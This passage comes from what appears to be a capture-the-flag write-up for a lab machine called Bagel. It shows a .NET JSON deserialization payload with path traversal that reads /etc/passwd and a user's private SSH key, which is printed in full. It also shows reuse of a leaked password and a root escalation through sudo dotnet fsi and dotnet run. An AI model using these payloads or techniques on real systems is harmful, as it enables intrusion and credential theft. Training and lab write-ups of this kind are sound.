Dumper:/:/usr/sbin/nologin\nsystemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin\ndeveloper:x:1000:1000::/home/developer:/bin/bash\nphil:x:1001:1001::/home/phil:/bin/bash\n_laurel:x:987:987::/var/log/laurel:/bin/false",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}

```

It works! It create a `RemoveOrder` object with a `ReadFile` in it that has `/etc/passwd`!

#### Read SSH Key

Just like with the previous file read, I can get the command line and environment here:

```

> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../proc/self/cmdline"}}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "4:23:21",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "dotnet\u0000/opt/bagel/bin/Debug/net6.0/bagel.dll\u0000",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../proc/self/environ"}}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "4:23:08",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "LANG=en_US.UTF-8\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\u0000HOME=/home/phil\u0000LOGNAME=phil\u0000USER=phil\u0000SHELL=/bin/bash\u0000INVOCATION_ID=f22816b43f6e4edbac23633fd856c9d7\u0000JOURNAL_STREAM=8:25239\u0000SYSTEMD_EXEC_PID=890\u0000",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}

```

The process is running out of `/home/phil`.

Reading `/home/phil/.ssh/id_rsa` returns a private SSH key:

```

> {"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../home/phil/.ssh/id_rsa"}}
< {
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "4:24:32",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}

```

### SSH

A quick way to reform a key like this with `\n` in it is with `jq`:

```

oxdf@hacky$ export KEY='"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAuhIcD7KiWMN8eMlmhdKLDclnn0bXShuMjBYpL5qdhw8m1Re3Ud+2\ns8SIkkk0KmIYED3c7aSC8C74FmvSDxTtN
Od3T/iePRZOBf5CW3gZapHh+mNOrSZk13F28N\ndZiev5vBubKayIfcG8QpkIPbfqwXhKR+qCsfqS//bAMtyHkNn3n9cg7ZrhufiYCkg9jBjO\nZL4+rw4UyWsONsTdvil6tlc41PXyETJat6dTHSHTKz+S7lL4wR/I+saVvj8KgoYtDCE1sV\nVftUZhkFImSL2ApxIv7tYmeJbombYff1SqjHAkdX9VKA0gM0zS7but3/klYq6g3l+NEZOC\nM0/I+30oaBoXCjvup
MswiY/oV9UF7HNruDdo06hEu0ymAoGninXaph+ozjdY17PxNtqFfT\neYBgBoiRW7hnY3cZpv3dLqzQiEqHlsnx2ha/A8UhvLqYA6PfruLEMxJVoDpmvvn9yFWxU1\nYvkqYaIdirOtX/h25gvfTNvlzxuwNczjS7gGP4XDAAAFgA50jZ4OdI2eAAAAB3NzaC1yc2\nEAAAGBALoSHA+yoljDfHjJZoXSiw3JZ59G10objIwWKS+anYcPJtUXt1HftrPEiJJJNCpi\nG
BA93O2kgvAu+BZr0g8U7TTnd0/4nj0WTgX+Qlt4GWqR4fpjTq0mZNdxdvDXWYnr+bwbmy\nmsiH3BvEKZCD236sF4SkfqgrH6kv/2wDLch5DZ95/XIO2a4bn4mApIPYwYzmS+Pq8OFMlr\nDjbE3b4perZXONT18hEyWrenUx0h0ys/ku5S+MEfyPrGlb4/CoKGLQwhNbFVX7VGYZBSJk\ni9gKcSL+7WJniW6Jm2H39UqoxwJHV/VSgNIDNM0u27rd/5JWKuoN5fjRG
TgjNPyPt9KGga\nFwo77qTLMImP6FfVBexza7g3aNOoRLtMpgKBp4p12qYfqM43WNez8TbahX03mAYAaIkVu4\nZ2N3Gab93S6s0IhKh5bJ8doWvwPFIby6mAOj367ixDMSVaA6Zr75/chVsVNWL5KmGiHYqz\nrV/4duYL30zb5c8bsDXM40u4Bj+FwwAAAAMBAAEAAAGABzEAtDbmTvinykHgKgKfg6OuUx\nU+DL5C1WuA/QAWuz44maOmOmCjdZA1M+vmzbzU+NR
MZtYJhlsNzAQLN2dKuIw56+xnnBrx\nzFMSTw5IBcPoEFWxzvaqs4OFD/QGM0CBDKY1WYLpXGyfXv/ZkXmpLLbsHAgpD2ZV6ovwy9\n1L971xdGaLx3e3VBtb5q3VXyFs4UF4N71kXmuoBzG6OImluf+vI/tgCXv38uXhcK66odgQ\nPn6CTk0VsD5oLVUYjfZ0ipmfIb1rCXL410V7H1DNeUJeg4hFjzxQnRUiWb2Wmwjx5efeOR\nO1eDvHML3/X4WivARfd7XMZZy
fB3JNJbynVRZPr/DEJ/owKRDSjbzem81TiO4Zh06OiiqS\n+itCwDdFq4RvAF+YlK9Mmit3/QbMVTsL7GodRAvRzsf1dFB+Ot+tNMU73Uy1hzIi06J57P\nWRATokDV/Ta7gYeuGJfjdb5cu61oTKbXdUV9WtyBhk1IjJ9l0Bit/mQyTRmJ5KH+CtAAAA\nwFpnmvzlvR+gubfmAhybWapfAn5+3yTDjcLSMdYmTcjoBOgC4lsgGYGd7GsuIMgowwrGDJ\nvE1yAS1vC
est9D51grY4uLtjJ65KQ249fwbsOMJKZ8xppWE3jPxBWmHHUok8VXx2jL0B6n\nxQWmaLh5egc0gyZQhOmhO/5g/WwzTpLcfD093V6eMevWDCirXrsQqyIenEA1WN1Dcn+V7r\nDyLjljQtfPG6wXinfmb18qP3e9NT9MR8SKgl/sRiEf8f19CAAAAMEA/8ZJy69MY0fvLDHT\nWhI0LFnIVoBab3r3Ys5o4RzacsHPvVeUuwJwqCT/IpIp7pVxWwS5mXiFFVtiwjeHq
psNZK\nEU1QTQZ5ydok7yi57xYLxsprUcrH1a4/x4KjD1Y9ijCM24DknenyjrB0l2DsKbBBUT42Rb\nzHYDsq2CatGezy1fx4EGFoBQ5nEl7LNcdGBhqnssQsmtB/Bsx94LCZQcsIBkIHXB8fraNm\niOExHKnkuSVqEBwWi5A2UPft+avpJfAAAAwQC6PBf90h7mG/zECXFPQVIPj1uKrwRb6V9g\nGDCXgqXxMqTaZd348xEnKLkUnOrFbk3RzDBcw49GXaQlPPSM4
z05AMJzixi0xO25XO/Zp2\niH8ESvo55GCvDQXTH6if7dSVHtmf5MSbM5YqlXw2BlL/yqT+DmBsuADQYU19aO9LWUIhJj\neHolE3PVPNAeZe4zIfjaN9Gcu4NWgA6YS5jpVUE2UyyWIKPrBJcmNDCGzY7EqthzQzWr4K\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----"'
oxdf@hacky$ echo $KEY | jq -r . | tee ~/keys/bagel-phil                                                 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAuhIcD7KiWMN8eMlmhdKLDclnn0bXShuMjBYpL5qdhw8m1Re3Ud+2
s8SIkkk0KmIYED3c7aSC8C74FmvSDxTtNOd3T/iePRZOBf5CW3gZapHh+mNOrSZk13F28N
...[snip]...
eHolE3PVPNAeZe4zIfjaN9Gcu4NWgA6YS5jpVUE2UyyWIKPrBJcmNDCGzY7EqthzQzWr4K
nrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=
-----END OPENSSH PRIVATE KEY-----

```

It works:

```

oxdf@hacky$ ssh -i ~/keys/bagel-phil phil@bagel.htb
Last login: Wed May 31 16:26:35 2023 from 10.10.14.6
[phil@bagel ~]$

```

And I can get `user.txt`:

```

[phil@bagel ~]$ cat user.txt
3e84c3ef************************

```

## Shell as developer

### Enumeration

There’s not much to see as phil. Their home directory is relatively empty:

```

[phil@bagel ~]$ ls -la
total 24
drwx------. 4 phil phil 4096 Jan 20 14:14 .
drwxr-xr-x. 4 root root   35 Aug  9  2022 ..
lrwxrwxrwx. 1 root root    9 Jan 20 17:59 .bash_history -> /dev/null
-rw-r--r--. 1 phil phil   18 Jan 20  2022 .bash_logout
-rw-r--r--. 1 phil phil  141 Jan 20  2022 .bash_profile
-rw-r--r--. 1 phil phil  492 Jan 20  2022 .bashrc
drwxrwxr-x. 3 phil phil 4096 Oct 22  2022 .dotnet
drwx------. 2 phil phil   61 Oct 23  2022 .ssh
-rw-r-----. 1 root phil   33 May 30 22:08 user.txt

```

There’s one other user, developer, but phil can’t access their home directory:

```

[phil@bagel ~]$ ls /home
developer  phil
[phil@bagel ~]$ cd /home/developer/
-bash: cd: /home/developer/: Permission denied

```

The project for the Dotnet application is in `/opt/bagel` :

```

[phil@bagel bagel]$ ls
bagel.csproj  bin  obj  orders  Program.cs

```

There’s no source in this directory - it seems to have been removed.

### su

I do have the password of “k8wdAYYKyhnjg3K” for the dev user to the future MySQL instance from the DLL. It works for developer:

```

[phil@bagel bagel]$ su - developer
Password: 
[developer@bagel ~]$

```

## Shell as root

### Enumeration

The developer user can run `dotnet` as root with `sudo`:

```

[developer@bagel ~]$ sudo -l
Matching Defaults entries for developer on bagel:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet

```

### Execution via dotnet

#### Help Menu

Running `dotnet -h` returns a long help menu:

```

[developer@bagel ~]$ dotnet -h
.NET SDK (6.0.113)
Usage: dotnet [runtime-options] [path-to-application] [arguments]

Execute a .NET application.

runtime-options:
  --additionalprobingpath <path>   Path containing probing policy and assemblies to probe for.
  --additional-deps <path>         Path to additional deps.json file.
  --depsfile                       Path to <application>.deps.json file.
  --fx-version <version>           Version of the installed Shared Framework to use to run the application.
  --roll-forward <setting>         Roll forward to framework version  (LatestPatch, Minor, LatestMinor, Major, LatestMajor, Disable).
  --runtimeconfig                  Path to <application>.runtimeconfig.json file.

path-to-application:
  The path to an application .dll file to execute.

Usage: dotnet [sdk-options] [command] [command-options] [arguments]

Execute a .NET SDK command.

sdk-options:
  -d|--diagnostics  Enable diagnostic output.
  -h|--help         Show command line help.
  --info            Display .NET information.
  --list-runtimes   Display the installed runtimes.
  --list-sdks       Display the installed SDKs.
  --version         Display .NET SDK version in use.

SDK commands:
  add               Add a package or reference to a .NET project.
  build             Build a .NET project.
  build-server      Interact with servers started by a build.
  clean             Clean build outputs of a .NET project.
  format            Apply style preferences to a project or solution.
  help              Show command line help.
  list              List project references of a .NET project.
  msbuild           Run Microsoft Build Engine (MSBuild) commands.
  new               Create a new .NET project or file.
  nuget             Provides additional NuGet commands.
  pack              Create a NuGet package.
  publish           Publish a .NET project for deployment.
  remove            Remove a package or reference from a .NET project.
  restore           Restore dependencies specified in a .NET project.
  run               Build and run a .NET project output.
  sdk               Manage .NET SDK installation.
  sln               Modify Visual Studio solution files.
  store             Store the specified assemblies in the runtime package store.
  test              Run unit tests using the test runner specified in a .NET project.
  tool              Install or manage tools that extend the .NET experience.
  vstest            Run Microsoft Test Engine (VSTest) commands.
  workload          Manage optional workloads.

Additional commands from bundled tools:
  dev-certs         Create and manage development certificates.
  fsi               Start F# Interactive / execute F# scripts.
  sql-cache         SQL Server cache command-line tools.
  user-secrets      Manage development user secrets.
  watch             Start a file watcher that runs a command when files change.

Run 'dotnet [command] --help' for more information on a command.

```

There’s a lot possible here, and several ways to exploit this.

#### F# Execution

In scrolling through these, `fsi` jumps out as an interesting command - “Start F# Interactive / execute F# script”.

A simple F# script to get a shell is `System.Diagnostics.Process.Start("id").WaitForExit();` This will run whatever shell command it’s given:

```

[developer@bagel ~]$ sudo dotnet fsi

Microsoft (R) F# Interactive version 12.0.0.0 for F# 6.0
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

> System.Diagnostics.Process.Start("id").WaitForExit();;     
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
val it: unit = ()

```

For whatever reason, F# needs `;;` to end this line.

I can do the same thing and invoke `bash`:

```

> System.Diagnostics.Process.Start("bash").WaitForExit();;
[root@bagel developer]#

```

From there, grab the flag:

```

[root@bagel developer]# cd /root/
[root@bagel ~]# cat root.txt
7ca14c4d************************

```

#### Execution via New Project

For fun, I’ll show how to create a fill C# application instead of running it from the F# terminal. I’ll create a directory, `/dev/shm/exploit`, and go into it. From there, I’ll create a new project with `dotnet`:

```

[developer@bagel exploit]$ dotnet new console 
The template "Console App" was created successfully.

Processing post-creation actions...
Running 'dotnet restore' on /dev/shm/exploit/exploit.csproj...
  Determining projects to restore...
  Restored /dev/shm/exploit/exploit.csproj (in 163 ms).
Restore succeeded.

[developer@bagel exploit]$ ls
exploit.csproj  obj  Program.cs

```

This creates a `.csproj` file, a starter `Program.cs`, and an `obj` directory. The source is a simple Hello World:

```

// See https://aka.ms/new-console-template for more information
Console.WriteLine("Hello, World!");

```

It runs:

```

[developer@bagel exploit]$ dotnet run
Hello, World!

```

I’ll update `Program.cs` to invoke a shell just as I did above:

```

Console.WriteLine("Going into shell...");
System.Diagnostics.Process.Start("bash").WaitForExit();
Console.WriteLine("Left shell, exiting!");

```

It works:

```

[developer@bagel exploit]$ sudo dotnet run
Going into shell...
[root@bagel exploit]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@bagel exploit]# cat /root/root.txt
7ca14c4d************************
[root@bagel exploit]# exit
exit
Left shell, exiting!

```